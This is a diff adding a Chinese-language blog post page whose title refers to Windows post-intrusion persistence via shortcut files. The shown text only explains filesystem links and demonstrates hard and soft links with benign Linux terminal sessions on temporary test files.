@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Windows_Post_Infiltration_Permission_Maintenance_lnk | thedarknessdied</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="[toc] 第一部分 Link0. 什么是 Link ？​	在操作系统中，特别是在文件系统中，”链接”（Link）是一种允许多个路径名指向同一文件或目录的机制。链接主要用于提高文件系统的灵活性，并允许更高效的数据访问。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows_Post_Infiltration_Permission_Maintenance_lnk">
+<meta property="og:url" content="http://example.com/2024/05/10/Windows-Post-Infiltration-Permission-Maintenance-lnk/index.html">
+<meta property="og:site_name" content="thedarknessdied">
+<meta property="og:description" content="[toc] 第一部分 Link0. 什么是 Link ？​	在操作系统中，特别是在文件系统中，”链接”（Link）是一种允许多个路径名指向同一文件或目录的机制。链接主要用于提高文件系统的灵活性，并允许更高效的数据访问。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20240508172836629.png">
+<meta property="og:image" content="http://example.com/images/image-20240508175501003.png">
+<meta property="og:image" content="http://example.com/images/image-20240508174117126.png">
+<meta property="og:image" content="http://example.com/images/image-20240508175805075.png">
+<meta property="og:image" content="http://example.com/images/image-20240508183439860.png">
+<meta property="og:image" content="http://example.com/images/image-20240508183418812.png">
+<meta property="og:image" content="http://example.com/images/image-20240508183716541.png">
+<meta property="og:image" content="http://example.com/images/image-20240510101330163.png">
+<meta property="og:image" content="http://example.com/images/image-20240510101458283.png">
+<meta property="og:image" content="http://example.com/images/image-20240510092054632.png">
+<meta property="og:image" content="http://example.com/images/image-20240510102632714.png">
+<meta property="og:image" content="http://example.com/images/image-20240510102536439.png">
+<meta property="og:image" content="http://example.com/images/image-20240510103244322.png">
+<meta property="og:image" content="http://example.com/images/image-20240510103018199.png">
+<meta property="og:image" content="http://example.com/images/image-20240510123034445.png">
+<meta property="og:image" content="http://example.com/images/image-20240510105653234.png">
+<meta property="og:image" content="http://example.com/images/image-20240510124659009.png">
+<meta property="og:image" content="http://example.com/images/image-20240510130227553.png">
+<meta property="og:image" content="http://example.com/images/image-20240510131501945.png">
+<meta property="og:image" content="http://example.com/images/image-20240510131058846.png">
+<meta property="og:image" content="http://example.com/images/image-20240510131543465.png">
+<meta property="og:image" content="http://example.com/images/image-20240510131326602.png">
+<meta property="og:image" content="http://example.com/images/image-20240510131558819.png">
+<meta property="og:image" content="http://example.com/images/image-20240510131758200.png">
+<meta property="og:image" content="http://example.com/images/image-20240510131816900.png">
+<meta property="og:image" content="http://example.com/images/image-20240510131949174.png">
+<meta property="og:image" content="http://example.com/images/image-20240510132337592.png">
+<meta property="og:image" content="http://example.com/images/image-20240510133732319.png">
+<meta property="og:image" content="http://example.com/images/image-20240510134552027.png">
+<meta property="og:image" content="http://example.com/images/image-20240510134748355.png">
+<meta property="og:image" content="http://example.com/images/image-20240510135333214.png">
+<meta property="og:image" content="http://example.com/images/image-20240510150427481.png">
+<meta property="og:image" content="http://example.com/images/image-20240510140847822.png">
+<meta property="og:image" content="http://example.com/images/image-20240510145131057.png">
+<meta property="og:image" content="http://example.com/images/image-20240510145119318.png">
+<meta property="og:image" content="http://example.com/images/image-20240510145828481.png">
+<meta property="og:image" content="http://example.com/images/image-20240510143910525.png">
+<meta property="og:image" content="http://example.com/images/image-20240510151252599.png">
+<meta property="og:image" content="http://example.com/images/image-20240510151304116.png">
+<meta property="og:image" content="http://example.com/images/image-20240508193227493.png">
+<meta property="og:image" content="http://example.com/images/image-20240509223229949.png">
+<meta property="og:image" content="http://example.com/images/image-20240509223333558.png">
+<meta property="og:image" content="http://example.com/images/image-20240402164638217.png">
+<meta property="og:image" content="http://example.com/images/1712047689007.png">
+<meta property="og:image" content="http://example.com/images/image-20240402164950749.png">
+<meta property="og:image" content="http://example.com/images/image-20240402165225392.png">
+<meta property="og:image" content="http://example.com/images/image-20240402165344284.png">
+<meta property="og:image" content="http://example.com/images/image-20240402165321403.png">
+<meta property="article:published_time" content="2024-05-10T07:37:23.000Z">
+<meta property="article:modified_time" content="2024-05-10T07:40:14.982Z">
+<meta property="article:author" content="R0seK1llere">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="Post">
+<meta property="article:tag" content="Permission">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20240508172836629.png">
+  
+    <link rel="alternate" href="/atom.xml" title="thedarknessdied" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">thedarknessdied</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">R0seK1ller</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Windows-Post-Infiltration-Permission-Maintenance-lnk" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/05/10/Windows-Post-Infiltration-Permission-Maintenance-lnk/" class="article-date">
+  <time class="dt-published" datetime="2024-05-10T07:37:23.000Z" itemprop="datePublished">2024-05-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Windows_Post_Infiltration_Permission_Maintenance_lnk
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<h1><span id="第一部分-link">第一部分 Link</span></h1><h2><span id="0-什么是-link">0. 什么是 Link ？</span></h2><p>​	在操作系统中，特别是在文件系统中，”链接”（Link）是一种允许多个路径名指向同一文件或目录的机制。链接主要用于提高文件系统的灵活性，并允许更高效的数据访问。</p>
+<span id="more"></span>
+
+<h2><span id="1-link-有什么作用">1. Link 有什么作用 ？</span></h2><ol>
+<li><p>快速访问文件或文件夹</p>
+<p>​	Link 文件提供了一种快速访问文件或文件夹的方式。通过双击或点击快捷方式，用户可以快速打开目标文件或文件夹，而无需手动导航到其所在的位置</p>
+</li>
+<li><p>创建应用程序快捷方式</p>
+<p>​	Link 文件可以用于创建应用程序的快捷方式。用户可以将应用程序的快捷方式放置在桌面、开始菜单或任务栏上，以便快速启动应用程序</p>
+</li>
+<li><p>自定义应用程序启动参数</p>
+<p>​	Link 文件允许用户在快捷方式上指定自定义的应用程序启动参数。这意味着用户可以通过快捷方式直接调用应用程序，并传递特定的命令行参数</p>
+</li>
+<li><p>管理网络资源快捷方式</p>
+<p>​	Link 文件可以用于创建指向网络资源（如共享文件夹、网络驱动器、网页等）的快捷方式。这样，用户可以快速访问网络资源，而无需手动输入网络路径或 URL</p>
+</li>
+<li><p>美化桌面和文件夹</p>
+<p>​	Link 文件可以用于在桌面和文件夹中创建自定义的图标快捷方式。用户可以将自己喜欢的图标与文件或文件夹关联起来，从而个性化和美化桌面和文件夹的外观</p>
+</li>
+</ol>
+<h2><span id="2-怎么创建-link">2. 怎么创建 Link ？</span></h2><p>​	可以通过命令行的方式手动创建 Link </p>
+<h3><span id="21-link-有哪些种类">2.1 Link 有哪些种类？</span></h3><p>​	在计算机文件系统中，<strong>硬链接</strong>和<strong>软链接</strong>是两种常见的连接技术。它们可以将文件或目录与其他位置建立关联，提供方便的文件管理和共享功能。</p>
+<p>​	(这快内容我们尝试用 Linux 系统作为演示环境，目的是为了更好的理解硬链接和软链接)</p>
+<h4><span id="211-硬链接">2.1.1 硬链接</span></h4><h5><span id="2111-硬链接的定义">2.1.1.1 硬链接的定义</span></h5><p>​	硬链接是指多个文件名指向同一个物理文件的链接关系。它们在文件系统中具有相同的 inode 号（索引节点号），但可以位于不同的目录中。当创建硬链接时，实际上是为文件增加了一个新的路径入口</p>
+<p><strong>注意1：inode是Unix&#x2F;Linux文件系统的一个概念，用于存储文件的元信息。Windows使用不同的文件系统，称为NTFS或FAT32，它们并不依赖inode</strong></p>
+<h5><span id="2112-硬链接的工作原理">2.1.1.2 硬链接的工作原理</span></h5><p>​	在创建硬链接时，操作系统会为新创建的链接分配相同的inode号，并在文件系统中的目录项中添加对应的链接关系。因此，无论通过哪个文件名访问该文件，都指向同一个inode，即同一个文件内容</p>
+<h5><span id="2113-硬链接的特点">2.1.1.3 硬链接的特点</span></h5><ul>
+<li>硬链接与原始文件之间没有区别，它们是完全平等的</li>
+<li>删除任何一个链接都不会影响其他链接</li>
+<li>每个文件系统都有自己独立的inode空间，硬链接不能跨越不同的文件系统</li>
+</ul>
+<h5><span id="2114-硬链接相关实验">2.1.1.4 硬链接相关实验</span></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建临时测试文件夹 /tmp/tmp.iC7dCifhBO</span></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ mktemp -d </span><br><span class="line">/tmp/tmp.iC7dCifhBO</span><br><span class="line">                                                  </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ cd /tmp/tmp.iC7dCifhBO</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建临时测试文件 test.txt</span>                                                             </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ touch test.txt                  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">stat</span> 查看测试文件信息</span>                                                       </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ stat test.txt                                    </span><br><span class="line">  File: test.txt</span><br><span class="line">  Size: 0               Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: 8,1     Inode: 1703958     Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: ( 1000/    kali)   Gid: ( 1000/    kali)</span><br><span class="line">Access: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line">Modify: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line">Change: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line"> Birth: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建 test_1.lnk 为 test.txt 的硬链接</span></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ ln test.txt test_1.lnk</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分别查看 test_1.lnk 和 test.txt 的文件属性</span>                   </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ stat test.txt</span><br><span class="line">  File: test.txt</span><br><span class="line">  Size: 0               Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: 8,1     Inode: 1703958     Links: 2</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: ( 1000/    kali)   Gid: ( 1000/    kali)</span><br><span class="line">Access: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line">Modify: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line">Change: 2024-05-08 01:35:04.571955648 -0400</span><br><span class="line"> Birth: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line">                               </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ stat test_1.lnk </span><br><span class="line">  File: test_1.lnk</span><br><span class="line">  Size: 0               Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: 8,1     Inode: 1703958     Links: 2</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: ( 1000/    kali)   Gid: ( 1000/    kali)</span><br><span class="line">Access: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line">Modify: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line">Change: 2024-05-08 01:35:04.571955648 -0400</span><br><span class="line"> Birth: 2024-05-08 01:29:05.976846798 -0400</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试向 test.txt 文件中写入一些内容</span></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ echo &quot;I just for test&quot; &gt;&gt; test.txt </span><br><span class="line">                                 </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ cat test.txt          </span><br><span class="line">I just for test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观察 test_1.lnk 是否能够更新内容</span>                                         </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ cat test_1.lnk     </span><br><span class="line">I just for test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除 test.txt 文件</span></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ rm -rf test.txt      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观察 test_1.lnk 是否能够读取到测试内容</span>                                       </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ cat test_1.lnk </span><br><span class="line">I just for test</span><br><span class="line">                                 </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ stat test_1.lnk </span><br><span class="line">  File: test_1.lnk</span><br><span class="line">  Size: 16              Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 8,1     Inode: 1703958     Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: ( 1000/    kali)   Gid: ( 1000/    kali)</span><br><span class="line">Access: 2024-05-08 01:40:45.955958542 -0400</span><br><span class="line">Modify: 2024-05-08 01:38:12.487957241 -0400</span><br><span class="line">Change: 2024-05-08 01:40:43.543958522 -0400</span><br><span class="line"> Birth: 2024-05-08 01:29:05.976846798 -0400</span><br></pre></td></tr></table></figure>
+
+<p>​	只有当所有指向该inode的硬链接都被删除后，其数据块通常会被操作系统回收并可能被其他文件重用，这意味着原始数据可能已经不可恢复(只要相对应的数据块没有被覆盖，那么是可以将文件还原回来的)。</p>
+<h6><span id="21141-无法跨分区-跨设备创建硬链接的原因分析">2.1.1.4.1 无法跨分区、跨设备创建硬链接的原因分析</span></h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">无法跨分区、跨设备创建硬链接</span></span><br><span class="line">──(kali㉿kali)-[/tmp/tmp.iC7dCifhBO]</span><br><span class="line">└─$ sudo ln test_1.lnk /boot/</span><br><span class="line">ln: failed to create hard link &#x27;/boot/test_1.lnk&#x27;=&gt; ’test_1.lnk‘: Invalid cross-device link</span><br></pre></td></tr></table></figure>
+
+<p>​	每个分区都有自己独立的inode体系，假设A分区的文件在B分区做了一个硬链接，此时访问B分区的此链接，按照我们想的是需要它访问A分区的inode,进行数据查询，但是它只会根据B分区的inode，在B数据块中查找数据</p>
+<h6><span id="21142-一般情况下无法创建文件夹硬链接的原因分析">2.1.1.4.2 一般情况下无法创建文件夹硬链接的原因分析</span></h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一般情况下无法创建文件夹的硬链接</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">file -&gt; directory</span></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ ln /tmp/tmp.iC7dCifhBO /tmp/dir.link</span><br><span class="line">ln: /tmp/tmp.iC7dCifhBO: hard link not allowed for directory</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">directory -&gt; directory</span></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ sudo ln /tmp/tmp.6oxI1VVtJD -d /tmp/tmp.6oxI1VVtJD/test</span><br><span class="line">ln: failed to create hard link &#x27;/tmp/tmp.6oxI1VVtJD/test&#x27; =&gt; &#x27;/tmp/tmp.6oxI1VVtJD&#x27;: Operation not permitted</span><br></pre></td></tr></table></figure>
+
+<p>​	一般情况下无法创建文件夹硬链接的原因如下：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 硬链接到目录</span><br><span class="line">   ​可以创建指向目录的硬链接，但这些硬链接必须位于与原目录相同的文件系统中。这是因为硬链接实际上是文件系统中的指针，如果允许跨文件系统的硬链接，可能会导致文件系统的引用计数出错</span><br><span class="line"><span class="bullet">2.</span> 目录的硬链接限制</span><br><span class="line">   ​创建指向目录的硬链接通常是为了创建一个别名或快捷方式。然而，由于硬链接的工作原理，指向目录的硬链接不能在文件系统的外部使用，因为外部的文件系统无法解析原始目录的路径</span><br><span class="line"><span class="bullet">3.</span> . 和 .. 特殊目录</span><br><span class="line">   ​每个目录自动拥有两个特殊的硬链接：.（指向自身）和 ..（指向其父目录）。这些是目录结构的一部分，并且由文件系统自动维护</span><br><span class="line"><span class="bullet">4.</span> 不允许循环链接</span><br><span class="line">   ​为了防止无限循环，Linux 不允许创建指向目录的硬链接，这些硬链接会导致形成目录循环（例如，dir1/dir2 指向 dir1，而 dir1 又指向 dir2）。创建这样的循环链接会导致许多命令（如 ls、find）陷入无限循环</span><br><span class="line"><span class="bullet">5.</span> 删除和重命名限制</span><br><span class="line">   ​不能删除或重命名指向目录的 . 或 .. 目录条目，因为这些操作是受系统保护的</span><br><span class="line"><span class="bullet">6.</span> 硬链接和目录的安全性</span><br><span class="line">   ​技术上可以创建指向目录的硬链接，但这种做法并不常见，因为如果不正确使用，可能会导致文件系统导航和权限管理上的混乱</span><br></pre></td></tr></table></figure>
+
+<h4><span id="212-软链接">2.1.2 软链接</span></h4><h5><span id="2121-软链接的定义">2.1.2.1 软链接的定义</span></h5><p>​	软链接是指一个文件名指向另一个文件或目录的符号链接。与硬链接不同，软链接实际上是一个特殊类型的文件，其中包含指向目标文件或目录的路径信息</p>
+<h5><span id="2122-软链接的工作原理">2.1.2.2 软链接的工作原理</span></h5><p>​	创建软链接时，操作系统会为其分配一个新的inode，并在文件系统中的目录项中添加软链接的信息，指向目标文件或目录的路径。当访问软链接时，操作系统会通过路径信息找到目标文件或目录</p>
+<h5><span id="2123-软链接的特点">2.1.2.3 软链接的特点</span></h5><ul>
+<li>软链接是一个独立文件，它的大小仅占用几个字节的存储空间</li>
+<li>删除原始文件或目录不会影响软链接的存在，但访问软链接时若目标文件不存在，则会报错</li>
+</ul>
+<h5><span id="2124-软链接相关实验">2.1.2.4 软链接相关实验</span></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建临时测试文件 test.txt</span></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ touch test.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建 test_1.lnk 为 test.txt 的软链接</span>                       </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ ln -s test.txt test_1.lnk                         </span><br><span class="line">                                 </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ ls -ail</span><br><span class="line">total 8</span><br><span class="line">1703964 drwx------  2 kali kali 4096 May  8 03:24 .</span><br><span class="line">1703937 drwxrwxrwt 17 root root 4096 May  8 03:23 ..</span><br><span class="line">1703969 lrwxrwxrwx  1 kali kali    8 May  8 03:24 test_1.lnk -&gt; test.txt</span><br><span class="line">1703968 -rw-r--r--  1 kali kali    0 May  8 03:24 test.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Inode: 1703968</span></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ stat test.txt                   </span><br><span class="line">  File: test.txt</span><br><span class="line">  Size: 0               Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: 8,1     Inode: 1703968     Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: ( 1000/    kali)   Gid: ( 1000/    kali)</span><br><span class="line">Access: 2024-05-08 03:24:17.321876625 -0400</span><br><span class="line">Modify: 2024-05-08 03:24:17.321876625 -0400</span><br><span class="line">Change: 2024-05-08 03:24:17.321876625 -0400</span><br><span class="line"> Birth: 2024-05-08 03:24:17.321876625 -0400</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Inode: 1703969</span>                            </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ stat test_1.lnk </span><br><span class="line">  File: test_1.lnk -&gt; test.txt</span><br><span class="line">  Size: 8               Blocks: 0          IO Block: 4096   symbolic link</span><br><span class="line">Device: 8,1     Inode: 1703969     Links: 1</span><br><span class="line">Access: (0777/lrwxrwxrwx)  Uid: ( 1000/    kali)   Gid: ( 1000/    kali)</span><br><span class="line">Access: 2024-05-08 03:24:34.824126375 -0400</span><br><span class="line">Modify: 2024-05-08 03:24:31.700438748 -0400</span><br><span class="line">Change: 2024-05-08 03:24:31.700438748 -0400</span><br><span class="line"> Birth: 2024-05-08 03:24:31.700438748 -0400</span><br></pre></td></tr></table></figure>
+
+<p>​	如上可以看出，软链接与原文件并不是同一inode，链接数也没有增加，文件大小也不一样</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试向 test.txt 文件中写入一些内容</span> </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ echo &quot;I just for test&quot; &gt;&gt; test.txt</span><br><span class="line">                                      </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ cat test.txt  </span><br><span class="line">I just for test</span><br><span class="line">                                       </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ cat test_1.lnk </span><br><span class="line">I just for test</span><br><span class="line">                                     </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ ll     </span><br><span class="line">total 4</span><br><span class="line">lrwxrwxrwx 1 kali kali  8 May  8 03:24 test_1.lnk -&gt; test.txt</span><br><span class="line">-rw-r--r-- 1 kali kali 16 May  8 03:35 test.txt</span><br></pre></td></tr></table></figure>
+
+<p>​	再次查看，原文件大小发生了改变，而链接文件大小依旧没变化。这其实就是软链接的特性之一，因为软链接的inode指向的数据块保存的是 原文件的路径，如果没有路径，是由文件名，默认会在软链接所在路径查找</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ mkdir test</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ cd test  </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD/test]</span><br><span class="line">└─$ ln -s ../test.txt /tmp/test</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD/test]</span><br><span class="line">└─$ ll /tmp/test               </span><br><span class="line">lrwxrwxrwx 1 kali kali 11 May  8 03:44 /tmp/test -&gt; ../test.txt</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD/test]</span><br><span class="line">└─$ cat /tmp/test     </span><br><span class="line">cat: /tmp/test: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>​	<code>cat /tmp/test</code>它会以自己的路径为初始点去寻找test.txt。即 “&#x2F;tmp&#x2F;test -&gt; …&#x2F;test.txt”，在系统看来，它会理解成”以test所在路径为起点，回到上一级目录，去寻找test.txt”。很显然没有找到，所以报错</p>
